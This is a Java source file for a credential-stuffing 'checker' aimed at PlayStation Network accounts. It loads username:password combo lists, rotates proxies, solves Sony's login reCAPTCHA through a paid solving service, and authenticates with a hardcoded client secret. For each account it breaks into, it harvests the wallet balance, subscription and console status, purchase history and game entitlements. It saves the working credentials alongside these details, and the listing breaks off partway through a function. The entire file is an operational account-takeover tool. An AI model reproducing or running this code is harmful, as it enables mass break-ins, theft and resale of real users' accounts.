package com.checker;

import java.io.*;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.chrono.Chronology;
import java.time.format.DateTimeFormatter;
import java.time.format.DateTimeFormatterBuilder;
import java.util.*;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.function.Predicate;
import java.util.stream.Collectors;

import com.google.api.client.util.DateTime;
import com.google.api.core.ApiFuture;
import com.google.auth.oauth2.GoogleCredentials;
import com.google.auth.oauth2.ServiceAccountCredentials;
import com.google.cloud.firestore.*;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseAuthException;
import com.google.firebase.auth.UserRecord;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.log4j.Logger;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import com.anti_captcha.Api.NoCaptchaProxyless;
import com.anti_captcha.Helper.DebugHelper;
import com.anti_captcha.Helper.HttpHelper;
import com.anti_captcha.Helper.JsonHelper;
import com.anti_captcha.Http.HttpRequest;
import com.anti_captcha.Http.HttpResponse;
import com.twocaptcha.api.ProxyType;
import com.twocaptcha.api.TwoCaptchaService;

public class Main {

	static ExecutorService executor = Executors.newFixedThreadPool(2);
	static String proxyHost = null;
	static String proxyPort = null;
    static String proxyUsername = null;
    static String proxyPassword = null;

    static String twoCaptchaToken = null;

	static int i=0;

	static BufferedReader br;
	static BufferedReader proxyBr;

	static Path outputFilePath;
	static Path successFilePath;
	static Path failFilePath;
	static Path jarDirectoryPath;

	static String token;
	static String inputFilePath;
	static String outputFileDirectory;
	static String proxyFilePath;

	static int accountNumberProgress = 1;

	static boolean hasAccess = false;

	public static void main(String[] args) throws RecaptchaSolvingError, Exception {
		jarDirectoryPath = Paths.get(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent();
		readArgs();
		hasAccess = authenticateUser();
		if(hasAccess) {
			System.out.println("Logged in successfully");
			readInputFiles(inputFilePath, proxyFilePath);
			createOuputFile(outputFileDirectory);
			List<String> proxies = loadProxies();
			List<Account> accounts = readAccountsFromFile();
			executeWorker(accounts, proxies);
		}
    }

    private static boolean authenticateUser() throws Exception, URISyntaxException, IOException {
		if(token.isEmpty())
			throw new Exception("Invalid token");
		System.out.println("Logging in with " + token);
		System.out.println("Please wait... ");
		ClassLoader loaderPw = Thread.currentThread().getContextClassLoader();
		GoogleCredentials credentials;
		try (InputStream serviceAccountStream = loaderPw.getResourceAsStream("psnch-51bab-firebase-adminsdk-zg2mv-34f2efe25d.json")) {
			credentials = ServiceAccountCredentials.fromStream(serviceAccountStream);
		}

		com.google.firebase.FirebaseOptions options = new com.google.firebase.FirebaseOptions.Builder()
				.setCredentials(credentials)
				.setDatabaseUrl("https://psnch-51bab.firebaseio.com")
				.build();

		FirebaseApp defaultApp = FirebaseApp.initializeApp(options);
		FirebaseAuth defaultAuth = FirebaseAuth.getInstance(defaultApp);

		FirestoreOptions firestoreOptions =
				FirestoreOptions.getDefaultInstance().toBuilder()
						.setCredentials(credentials)
						.setProjectId("psnch-51bab")
						.build();

		Firestore db = firestoreOptions.getService();

		boolean hasAccess = false;

		try {
			UserRecord user = defaultAuth.getUser(token);

			DocumentReference docRef = db.collection("users").document(token);
			DocumentSnapshot document = docRef.get().get();

			try {
				URL url_name = new URL("http://bot.whatismyipaddress.com");
				BufferedReader sc =
						new BufferedReader(new InputStreamReader(url_name.openStream()));
				String ipAddress = sc.readLine().trim();
				if (document.exists()) {
					String storedIpAddress = (String) document.getData().get("ip");

					if (storedIpAddress != null && storedIpAddress.compareToIgnoreCase(ipAddress) == 0 && !user.isDisabled()) {
						hasAccess = true;
					} else if (storedIpAddress == null || storedIpAddress.compareToIgnoreCase(ipAddress) != 0) {
						System.out.println("Your Ip address is not registred");
					} else if (user.isDisabled()) {
						System.out.println("Your account has been disabled");
					}
				} else {
					Map<String, Object> data = new HashMap<>();
					data.put("ip", ipAddress);
					ApiFuture<WriteResult> result = docRef.set(data);
					hasAccess = true;
				}

				return hasAccess;
			}
        	catch (Exception e){
			}

		}catch(FirebaseAuthException | InterruptedException | ExecutionException authException) {
			System.out.println("Invalid token");
		}
		return false;
	}

    private static void readArgs() {
		JSONParser jsonParser = new JSONParser();

		Path configFilePath = Paths.get(jarDirectoryPath + "/" + "config.json");
		try {
            FileReader reader = new FileReader(configFilePath.toFile());
            org.json.simple.JSONObject config = (org.json.simple.JSONObject) jsonParser.parse(reader);
            token = (String)config.get("access_token");
            inputFilePath = jarDirectoryPath + "/" + (String)config.get("input_file_path");
            outputFileDirectory = jarDirectoryPath.toString();
            proxyFilePath = jarDirectoryPath + "/" + (String)config.get("proxy_file_path");
            org.json.simple.JSONObject proxyAuth = (org.json.simple.JSONObject) config.get("proxy_auth");
            proxyUsername = (String)proxyAuth.get("username");
            proxyPassword = (String)proxyAuth.get("password");
            twoCaptchaToken = (String)config.get("2captcha_token");

		} catch (IOException | ParseException e) {
			e.printStackTrace();
		}

	}

	private static void readInputFiles(String inputFilePath, String proxyFilePath) throws Exception {
		try {
			br = new BufferedReader(new FileReader(inputFilePath));
		} catch (FileNotFoundException e) {
			throw new Exception("Input file path invalid");
		}
		try {
			proxyBr = new BufferedReader(new FileReader(proxyFilePath));
		} catch (FileNotFoundException e) {
			throw new Exception("Proxy file path invalid");
		}
	}

	private static void createOuputFile(String outputFileDirectory) throws Exception {
		try {
			LocalDate currentDate = LocalDate.now();
			LocalTime currentTime = LocalTime.now();
			LocalDateTime now = LocalDateTime.of(currentDate, currentTime);
			DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss");
			String nowStr = formatter.format(now);
			Path directory = Files.createDirectory(Paths.get(outputFileDirectory + "/output_" + nowStr));
			outputFilePath = Files.createFile(Paths.get(directory.toAbsolutePath() + "/result.txt"));
			successFilePath = Files.createFile(Paths.get(directory.toAbsolutePath() + "/success.txt"));
			failFilePath = Files.createFile(Paths.get(directory.toAbsolutePath() + "/fail.txt"));
		} catch (IOException e) {
			throw new Exception("Unable to create output file");
		}
	}

    private static void executeWorker(List<Account> accounts, List<String> proxies) throws RecaptchaSolvingError {
		PrintWriter resultPw = null;
		PrintWriter successPw = null;
		PrintWriter failPw = null;

		List<Account> validAccounts = accounts
				.stream()
				.skip(accountNumberProgress - 1)
				.collect(Collectors.<Account>toList());

        for(Account acc : validAccounts) {
//			executor.execute(new Runnable() {
				String accountInfosDisplay = "";
				
//				@Override
//				public void run() {
					if(proxies.size() > 0) {
						Random random = new Random();
						int randomIndex = random.nextInt(proxies.size());
						proxyHost = proxies.get(randomIndex);
					}

		        	System.out.println("Progress: " + i + " of " + validAccounts.size() + " accounts has been checked" );
		        	
		        	try {
						resultPw = new PrintWriter(
						        new FileWriter(new File(outputFilePath.toUri()), true));
						successPw = new PrintWriter(
								new FileWriter(new File(successFilePath.toUri()), true));
						failPw = new PrintWriter(
								new FileWriter(new File(failFilePath.toUri()), true));
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

		        	String username = acc.getUsername();
		            String password = acc.getPassword();
		            
		            boolean retry = true;
		            int retryTimes = 0;
		            while(retry) {
		                String token = "";
		                if(proxyHost != null)
		                	System.out.println("Logging on " + proxyHost + ":" + proxyPort);
		                String recaptchaToken = resolveWith2Captcha();
						System.out.println("Checking account " + acc);
			            Object[] result = authenticate(recaptchaToken, username);
			            if (result != null) {
				            token = (String) result[0];
				            Map<String, String> cookies = (Map<String, String>) result[1];
			            	cookies = getSsoCookie(token, username, password, cookies);
			                result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D9281f207-82e0-4d11-8d42-f1c66a7959a3");
			                if(result != null) {
				                token = (String) result[0];
				                cookies = (Map<String, String>) result[1];
				            	String balance = getBalance(token, cookies);
				            	
				            	Object[] codeAuthResult = authorizeWithCode(cookies, '&', '&', "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D06b9d0fa-8fa6-4031-81ba-9d522d160844");
				            	cookies = (Map<String, String>) codeAuthResult[0];
				            	String authorizationCode = (String) codeAuthResult[1];
				            	result = getSesstionCookies(authorizationCode, token, cookies);
				            	String language = (String) result[0];
				            	String country = (String) result[1];
				            	cookies = (Map<String, String>) result[2];
				            	boolean isPsPlus = isPsPlusMember(token, cookies);
				            	boolean isPs4Activated = isPs4SystemActivated(token, cookies);
				            	boolean isNoDesactivateAvailable = isNoDesactivateAvailable(cookies);
				            	String psPlusStr = isPsPlus ? "pssPlus" : "notPsPlus";
				            	String ps4ActivatedStr = isPs4Activated ? "Ps4_activated" : "Ps4_not_activated";
				            	String ps4DesactivateAll = isNoDesactivateAvailable ? "DESACTIVATE_ALL" : "NO_DESACTIVATE_ALL";
				            	String profileDisplay = "<-------------- " 
				            			+ username + ":" + password + "(" + language + "-" + country + "," + balance + "," +
		            					psPlusStr + "," + ps4DesactivateAll + "," + ps4ActivatedStr + ")" + "------------------>\n";
				            	accountInfosDisplay += profileDisplay;
				            	accountInfosDisplay += getEntitlements(cookies,language,country);
				            	successPw.println(acc);
			                }
			                else {
			                	String profileDisplay = "<-------------- " + username + ":" + password + " <<<< ERROR >>>>" + "------------------>\n";
			                	accountInfosDisplay += profileDisplay;
								failPw.println(acc);
			                }
			                retry = false;
			            }
			            else if(retryTimes < 2 ){
							retryTimes ++;
			            	retry = true;
			            }
			            else {
			            	retry = false;
						}
		            }
		            System.out.println(accountInfosDisplay);
					resultPw.println(accountInfosDisplay);
					resultPw.close();
					successPw.close();
					failPw.close();
		            i++;
//				}
//			});
        }
    }
    
    private static List<String> loadProxies() {
    	List<String> proxies = new ArrayList<String>();
			try {
				String currentLine;
				while ((currentLine = proxyBr.readLine()) != null) {
					proxies.add(currentLine);
				}
			}
			catch (FileNotFoundException  e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			finally{
				try {
					proxyBr.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
			
			return proxies;
    }
    
	private static List<Account> readAccountsFromFile() throws URISyntaxException {
	    List<Account> accounts = new ArrayList<Account>();
	    try {
			String currentLine;
	        List<Account> checkedAccounts = new ArrayList<Account>();
			Account account = null;
			while ((currentLine = br.readLine()) != null) {
				account = extractListFromInput(currentLine, account);
				if(account != null && account.getUsername().compareTo("") != 0 && account.getPassword().compareTo("") != 0) {
					if(!IsDoublon(account, checkedAccounts)) {
						accounts.add(new Account(account.getUsername(), account.getPassword()));
						checkedAccounts.add(new Account(account.getUsername(), account.getPassword()));
					}
					account = null;
				}
			}
			br.close();
			return checkedAccounts;
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
        
	}
	
	@SuppressWarnings("unused")
	private static Account extractListFromInput(String currentLine, Account account) {
		if(currentLine.contains(":")) {
		    account = new Account();
			account.setUsername(currentLine.split(":")[0]);
			account.setPassword(currentLine.split(":")[1]);
		}
		return account;
	}

	static boolean IsDoublon(final Account account, List<Account> checkedAccounts) {
		return !checkedAccounts.parallelStream().filter(
				new Predicate<Account>() {
					public boolean test(Account checkedAccount) {
						return checkedAccount.getUsername().compareTo(account.getUsername()) == 0 &&
							   checkedAccount.getPassword().compareTo(account.getPassword()) == 0;
					}
				}
			).collect(Collectors.toList()).isEmpty();
	}
   
	private static boolean isPs4SystemActivated(String accountAuthorizationToken, Map<String, String> cookies) {
		HttpRequest request = new HttpRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/gateway/store/v1/users/me/device/activation/count");
		request.setCookies(cookies);
		request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
		HttpResponse response;
	      try {
	          response = HttpHelper.download(request);
	          JSONObject responseJson = new JSONObject(response.getBody());
	          try {
	          return responseJson
	        		  .getJSONObject("activatedConsoles")
	        		  .getInt("ps4") 
	        		  > 0;
	          }catch(JSONException jse) { return false;}
	      }catch(Exception e) {}
	      
		return false;
	}
	
	private static boolean isNoDesactivateAvailable(Map<String, String> cookies) {
        cookies = authorizeWithCodeRedirect( cookies,  "https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false");

		HttpResponse response;
	      try {
	    	HttpRequest request = new HttpRequest("https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false");
	  		request.setCookies(cookies);
	  		request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
	  		response = HttpHelper.download(request);
	  		String html = response.getBody();
	  		Document doc = Jsoup.parse(html);
	  		Element deactivateAllDeviceBoxWrapper = doc.getElementById("deactivateAllDeviceBoxWrapper");
	  		if(deactivateAllDeviceBoxWrapper != null) {
	  			return true;
	  		}

	  		Element gameMessageButtonWrapper = doc.getElementById("gameMessageButtonWrapper");
	  		if(gameMessageButtonWrapper != null) {
	  			return false;
	  		}

	      }catch(Exception e) {}
		return false;

	}

	private static boolean isPsPlusMember(String accountAuthorizationToken, Map<String, String> cookies) {
		HttpRequest request = new HttpRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/profile");
		request.setCookies(cookies);
		request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
		HttpResponse response;
	      try {
	          response = HttpHelper.download(request);
	          JSONObject responseJson = new JSONObject(response.getBody());
	          return responseJson
	        		  .getJSONObject("data")
	        		  .getBoolean("ps_plus");
	      }catch(Exception e) {}
		return false;
	}
	
    private static Object[] getSesstionCookies(String authorizationCode, String accountAuthorizationToken, Map<String, String> cookies) {
    	
    	List<Map<String, String>> headers = new ArrayList<Map<String, String>>();
        Map<String, String> contentType = new HashMap<String, String>();
        contentType.put("Content-Type", "application/x-www-form-urlencoded");
        Map<String, String> xAltRefererHeader = new HashMap<String, String>();
        xAltRefererHeader.put("x-alt-referer", "https://store.playstation.com/html/webIframeRedirect.html?requestId=06b9d0fa-8fa6-4031-81ba-9d522d160844");
        headers.add(contentType);
        headers.add(xAltRefererHeader);
        
        String jsonPostData = "code=" + authorizationCode;

        HttpResponse postResponse = jsonPostRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/session", cookies,
                headers, jsonPostData);
        try {
            JSONObject postResult = new JSONObject(postResponse.getBody());
            Object[] result = new Object[3];
            String language = postResult.getJSONObject("data").getString("language");
            String country = postResult.getJSONObject("data").getString("country");
            result[0] = language;
            result[1] = country;
            result[2] = postResponse.getCookies();
            return result;
        }catch (Exception e) {}
		return null;
    }
    
    private static JSONObject getCoreInfos(String authorizationToken, Map<String, String> cookies) {
    	
    	HttpRequest request = new HttpRequest("https://accounts.api.playstation.com/api/v1/accounts/me/core");
      
        request.addHeader("Authorization", "Bearer " + authorizationToken);
        request.setCookies(cookies); 
        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
        
        HttpResponse response;
        try {
          response = HttpHelper.download(request);
          return new JSONObject(response.getBody());
        }catch(Exception e) {e.printStackTrace();}
        
		return null;
    }
    
    private static boolean checkIfPurchased(String productIdToCheck, List<String> productIds) {
    	return !productIds
    		.parallelStream()
    		.filter(productId -> productId.compareToIgnoreCase(productIdToCheck) == 0)
    		.collect(Collectors.toList())
    		.isEmpty();
    }
    
    private static List<String> getPurchasedGames(Map<String, String> cookies, String language, String country) {
	  Object[] result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D4a21e2e5-70c0-4d35-86cb-50b11e0e6391");
	  String authorizationToken = (String) result[0];
	  cookies = (Map<String, String>) result[1];
	  JSONObject coreInfosWrapper = getCoreInfos(authorizationToken, cookies);
	  try {
		  String accountId = coreInfosWrapper.getString("accountId");
		
		  HttpRequest request = new HttpRequest(
	          "https://wallets.api.playstation.com/api/transactions/summaries?ownerAccountId=" + accountId + "&limit=500&startDate=2014-01-01T00%3A00%3A00.000%2B0100&endDate=2020-02-16T23%3A59%3A59.999%2B0100&includePurged=false&transactionTypes=PRODUCT_PURCHASE,VOUCHER_PURCHASE");

	      request.addHeader("Authorization", "Bearer " + authorizationToken);
	      request.setCookies(cookies); 
	      request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
	      
	      HttpResponse response;
	
	        response = HttpHelper.download(request);
	        JSONObject responseJson = new JSONObject(response.getBody());
	        JSONArray transactions = 
	        		responseJson
	        			.getJSONArray("transactions");
	        	        
	        List<String> checkedProductNames = new ArrayList<String>();

	        for(int i=0; i<transactions.length(); i++) {
	        	JSONArray orders = 
	        			transactions
			        		.getJSONObject(i)
			        		.getJSONObject("additionalInfo")
			        		.getJSONArray("orderItems");
	        	for(int j=0; j<orders.length(); j++) {
	        		JSONObject order = 
	        				orders
	        					.getJSONObject(j);
	        		int totalPrice = order.getInt("totalPrice");
	        		boolean isPSNReduced = false;
	        		try {
	        			JSONArray orderItemDiscounts = order.getJSONArray("orderItemDiscounts");
	        			isPSNReduced = orderItemDiscounts.length() > 0 
	        					&& 
	        					orderItemDiscounts.getJSONObject(0).getInt("discountAmount") > 0;
	        		}catch(JSONException e) {}
	        		
	        		if(totalPrice > 0 || isPSNReduced) {
						checkedProductNames.add(order.getString("skuId"));
	        		}
	        			
	        	}
	        }
	        return checkedProductNames;
	        
      }catch(Exception e) {e.printStackTrace();}
	return null;
    }

    private static String getBalance(String authorizationToken, Map<String, String> cookies) {
    	HttpRequest request = new HttpRequest(
                "https://wallets.api.playstation.com/api/v1/wallets/me");
    	
        request.addHeader("Authorization", "Bearer " + authorizationToken);
        request.setCookies(cookies);
        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
        
        HttpResponse response;
        try {
            response = HttpHelper.download(request);
            JSONObject responseObject = new JSONObject(response.getBody());
            double amount = responseObject.getDouble("currentAmount") / 100;
            return amount + " " + responseObject.getString("currencyCode");

        } catch (Exception e) {
            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);
            return null;
        }
    }
    
    private static String getLanguage(String authorizationToken, Map<String, String> cookies) {
    	HttpRequest request = new HttpRequest(
                "https://accounts.api.playstation.com/api/v1/accounts/me/languages");
    	
        request.addHeader("Authorization", "Bearer " + authorizationToken);
        request.setCookies(cookies);
        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
        
        HttpResponse response;
        try {
            response = HttpHelper.download(request);
            JSONObject responseObject = new JSONObject(response.getBody());
            return responseObject.getString("language");

        } catch (Exception e) {
            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);
            return null;
        }
    }
    
    private static Object[] authorizeWithCode(Map<String, String> cookies, char startChar, char endChar, String url) {
        HttpRequest request = new HttpRequest(url);
        try {
            request.setCookies(cookies);
            request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
            request.setFollowRedirects(false);
            HttpResponse response = HttpHelper.download(request);
            String locationRedirect = response.getHeaders().get("Location");
            Object[] result = new Object[2];
			result[0] = response.getCookies();
			int startIndex = locationRedirect.indexOf(startChar) + 1;
			int endIndex = locationRedirect.indexOf(endChar, startIndex);
			String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
			String[] authorizationTokenList = authorizationTokenStr.split("=");
			result[1] = authorizationTokenList[1];
            return result;
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }

	private static Map<String, String> authorizeWithCodeRedirect(Map<String, String> cookies, String url) {
			HttpRequest request = new HttpRequest(url);
			try {
				request.setCookies(cookies);
				request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
				request.setFollowRedirects(false);
				HttpResponse response = HttpHelper.download(request);
				String locationRedirect = response.getHeaders().get("Location");

				HttpRequest request2 = new HttpRequest(locationRedirect);
				request2.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
				request2.setFollowRedirects(false);
				request2.setCookies(cookies);
				HttpResponse response2 = HttpHelper.download(request2);
				locationRedirect = response2.getHeaders().get("Location");

				HttpRequest request3 = new HttpRequest(locationRedirect);
				request3.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
				request3.setFollowRedirects(false);
				request3.setCookies(cookies);
				HttpResponse response3 = HttpHelper.download(request3);

				return response3.getCookies();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return null;
	}

		private static Object[] authorize(Map<String, String> cookies, String url) {
        HttpRequest request = new HttpRequest(url);
        try {
            request.setCookies(cookies);
            request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
            request.setFollowRedirects(false);
            HttpResponse response = HttpHelper.download(request);
            String locationRedirect = response.getHeaders().get("Location");
            int startIndex = locationRedirect.indexOf("#");
            int endIndex = locationRedirect.indexOf("&", startIndex);
            if(startIndex != -1) {
	            String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
	            String[] authorizationTokenList = authorizationTokenStr.split("=");
	            Object[] result = new Object[2];
	            result[0] = authorizationTokenList[1];
	            result[1] = response.getCookies();
	            return result;
            }
            return null;
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }

    private static Map<String, String> getSsoCookie(String access_token, String username, String password, Map<String, String> cookies) {
        JSONObject postData = new JSONObject();

        try {
            postData.put("authentication_type", "password");
            postData.put("client_id", "71a7beb8-f21a-47d9-a604-2e71bee24fe0");
            postData.put("password", password);
            postData.put("username", username);
        } catch (JSONException e) {
            //DebugHelper.out("JSON compilation error: " + e.getMessage(), //DebugHelper.Type.ERROR);
        }

        List<Map<String, String>> headers = new ArrayList<Map<String, String>>();
        Map<String, String> contentType = new HashMap<String, String>();
        contentType.put("Content-Type", "application/json");
        Map<String, String> authorization = new HashMap<String, String>();
        contentType.put("Authorization", "Bearer " + access_token);
        headers.add(contentType);
        headers.add(authorization);

        HttpResponse postResponse = jsonPostRequest("https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie", cookies,
                headers, JsonHelper.asString(postData));

        try {
            JSONObject postResult = new JSONObject(postResponse.getBody());
            Integer error_code = null;
            try {
            	error_code = JsonHelper.extractInt(postResult, "error_code");
            } catch (Exception e) {}

            if (error_code == null) {
                return postResponse.getCookies();
            } else {
                //DebugHelper.out("Unknown error", //DebugHelper.Type.ERROR);
            }

        } catch (Exception e) {
            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);

            return null;
        }
        return null;

    }

    private static Object[] authenticate(String recaptchaToken, String username) {
        String jsonPostData = "grant_type=captcha" + "&captcha_provider=google:recaptcha-invisible"
                + "&scope=oauth:authenticate" + "&valid_for=" + username
                + "&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0" + "&client_secret=xSk2YI8qJqZfeLQv"
                + "&response_token=" + recaptchaToken;

        List<Map<String, String>> headers = new ArrayList<Map<String, String>>();
        Map<String, String> contentType = new HashMap<String, String>();
        contentType.put("Content-Type", "application/x-www-form-urlencoded");
        headers.add(contentType);

        HttpResponse postResponse = jsonPostRequest("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/token", null,
                headers, jsonPostData);
        try {
            JSONObject postResult = new JSONObject(postResponse.getBody());
            Integer error_code = null;
            try {
            	error_code = JsonHelper.extractInt(postResult, "error_code");
            } catch (Exception e) {}

            if (error_code == null) {
            	Object[] result = new Object[2];
            	result[0] = JsonHelper.extractStr(postResult, "access_token");
            	result[1] = postResponse.getCookies();
                return result;
            }

        } catch (Exception e) {
            e.printStackTrace();

            return null;
        }
        return null;

    }
    
    private static String resolveWith2Captcha() throws RecaptchaSolvingError {
		String apiKey = twoCaptchaToken;
		String googleKey = "6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5";
		String pageUrl = "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin";


		/**
		 * With proxy and user authentication
		 */
		TwoCaptchaService service = new TwoCaptchaService(apiKey, googleKey, pageUrl, null, null, null, null, ProxyType.HTTP);

		/**
		 * Without proxy and user authentication
		 * TwoCaptchaService service = new TwoCaptchaService(apiKey, googleKey, pageUrl);
		 */
		
		try {
			String responseToken = service.solveCaptcha();
			System.out.println("Recaptcha solved successfully");
			return responseToken;
		} catch (IOException | IllegalStateException | InterruptedException e) {
			throw new RecaptchaSolvingError();
		}

    }

    public static HttpResponse jsonPostRequest(String url, Map<String, String> cookies, List<Map<String, String>> headers, String jsonPostData) {

        HttpRequest request = new HttpRequest(url);
        if(cookies != null)
        	request.setCookies(cookies);
        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
        request.setRawPost(jsonPostData);
        for (Map<String, String> header : headers) {
            for (Map.Entry<String, String> entry : header.entrySet()) {
                request.addHeader(entry.getKey(), entry.getValue());
            }
        }
        String rawJson;

        try {
            return HttpHelper.download(request);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }

    }
   
  @SuppressWarnings("unchecked")
private static String getEntitlements(Map<String, String> cookies, String language, String country) {
  	String accountGames = "";
  	Object[] result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=d932d31d-e8fc-4058-bd22-16d474938353&scope=kamaji%3Aget_vu_mylibrary%2Ckamaji%3Aget_recs%2Ckamaji%3Aget_internal_entitlements%2Cgenome%3Agene_get%2Cwallets%3Ainstrument.get&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D12730db4-0893-41bc-99e3-0b1a6f5906d7");
  	String authorizationToken = (String) result[0];
  	cookies = (Map<String, String>) result[1];
  	
  	HttpRequest request = new HttpRequest(
          "https://commerce.api.np.km.playstation.net/commerce/api/v1/users/me/internal_entitlements?start=0&size=2000&revision=0&meta_rev=0&fields=meta_rev%2Ccloud_meta%2Creward_meta%2Cgame_meta%2Cdrm_def%2Cdrm_def.content_type");

      request.addHeader("Authorization", "Bearer " + authorizationToken);
      request.setCookies(cookies);
      request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
      
      HttpResponse response;
      try {
          response = HttpHelper.download(request);
          JSONObject entitlementsWrapper = new JSONObject(response.getBody());
          
          List<String> products = new ArrayList<String>();
          JSONArray entitlements = entitlementsWrapper.getJSONArray("entitlements");
          List<String> checkedProductIds = getPurchasedGames(cookies, language, country);
          for (int i=0; i<entitlements.length(); i++) {
          	JSONObject entitlement = entitlements.getJSONObject(i);
          	boolean isAGame = false;
			try {
				isAGame = 
					entitlement
			  			.getJSONObject("game_meta")
			  			.getString("type")
